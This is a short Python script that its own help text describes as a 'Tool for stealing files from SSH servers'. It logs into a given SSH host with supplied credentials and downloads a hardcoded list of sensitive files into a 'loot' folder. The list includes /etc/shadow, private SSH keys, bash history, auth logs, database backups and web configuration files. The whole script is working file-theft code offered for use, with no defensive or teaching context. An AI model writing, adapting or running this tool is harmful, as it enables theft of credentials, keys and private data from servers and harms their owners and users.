import paramiko
import argparse
import os
from socket import timeout as stimeout
from colorama import Fore, init

directs = [
    # Linux
    "/etc/passwd",
    "/etc/shadow", 
    "/etc/ssh/sshd_config",
    "/home/user/.bash_history",
    "/home/user/.ssh/id_rsa",
    "/var/log/auth.log",
    "/var/www/html/config.php",
    "/opt/backup.sql",

    # Windows
    "C:\\Users\\Administrator\\Desktop\\passwords.txt",
    "C:\\ProgramData\\ssh\\sshd_config",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Users\\%USERNAME%\\.ssh\\id_rsa",
    "C:\\xampp\\htdocs\\config.php",
    "C:\\inetpub\\wwwroot\\web.config"
]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

init()
os.makedirs("loot", exist_ok=True)
parser = argparse.ArgumentParser(description="Tool for stealing files from SSH servers")

parser.add_argument("ip", help="Enter IP of SSH server")
parser.add_argument("-user", "--username", required=True, help="Enter the username of  SSH Server")
parser.add_argument("-passw", "--password", required=True, help="Enter the password of SSH Server")

args = parser.parse_args()

sftp = None
try:
    ssh.connect(args.ip, username=args.username, password=args.password)
    sftp = ssh.open_sftp()
    print(Fore.GREEN + "Successful connection" + Fore.RESET)

    for path in directs:
        try:
            sftp.stat(path)
            safe_path = path.replace(':', '_').replace('\\', '_')
            sftp.get(path, f"./loot/{safe_path}")
            print(Fore.GREEN + f"Downloaded file: {path}" + Fore.RESET)
        except FileNotFoundError:
            print(Fore.RED + f"{path} File not found" + Fore.RESET)
except paramiko.AuthenticationException:
    print(Fore.RED + "Incorrect password or login" + Fore.RESET)
except stimeout:
    print(Fore.RED + "Connection Timeout" + Fore.RESET)
except Exception as e:
    print(Fore.RED + f"An unknown error occurred {e}" + Fore.RESET)
finally:
    if sftp:
        sftp.close()
    ssh.close()